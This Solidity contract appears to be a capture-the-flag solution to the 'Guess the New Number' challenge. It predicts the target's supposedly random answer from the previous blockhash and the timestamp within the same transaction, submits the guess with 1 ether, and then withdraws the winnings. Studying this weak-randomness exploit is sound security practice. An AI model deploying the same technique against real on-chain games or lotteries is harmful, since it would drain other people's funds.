pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
    function isComplete() public view returns (bool);
}

contract CTFGuessTheNewNumber {
    address public guessschallangeAddress;
    uint256 public lastFullAnswer;
    uint8   public lastAnswer;

    function CTFGuessTheNewNumber() public {
        
    }

    function setGuessMeAddress(address _address) public {
        guessschallangeAddress = _address;
    }

    function getGuessAddress() public view returns(address) {
        return guessschallangeAddress;
    }
    
    function doCaptureByBlockNum(uint nBlockNum) public payable {
        require(msg.value == 1 ether);

        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(nBlockNum), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doCapture() public payable {
        require(msg.value == 1 ether);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        guessInstance.guess.value(msg.value)(answer);
    }

    function doWithLastAnswer()public payable {
        require(msg.value == 1 ether);

        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        guessInstance.guess.value(lastAnswer);
    }

    function doSetLastNumExample() public {
        uint nLastBlock = block.number - 1;
        lastFullAnswer = uint256(keccak256(block.blockhash(nLastBlock), now));
        lastAnswer = uint8(lastFullAnswer);
    }

    function doSetLastNum() public payable {
        require(msg.value == 1 ether);
        uint nLastBlock = block.number - 1;
        lastFullAnswer = uint256(keccak256(block.blockhash(nLastBlock), now));
        lastAnswer = uint8(lastFullAnswer);
    }

    function dontHaveCap() public payable {
        require(msg.value == 1 ether);
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        lastAnswer= uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.gas(10000000).value(1 ether)(lastAnswer);
    }

    function dontHaveCapExample() public view returns(uint8){
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function hasComplete() public view returns(bool){
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        bool complete = guessInstance.isComplete();
        return complete;
    }

    function withDraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function () public payable {
        /// @notice payable to call eher transefer
        /// @dev 没有reveive时候被调用，否则会崩溃
        /// @param Documents a parameter just like in doxygen (must be followed by parameter name)
        /// @return Documents the return variables of a contract’s function state variable
        /// @inheritdoc	Copies all missing tags from the base function (must be followed by the contract name)
    }

    // function receive() external payable {
   
    // }
}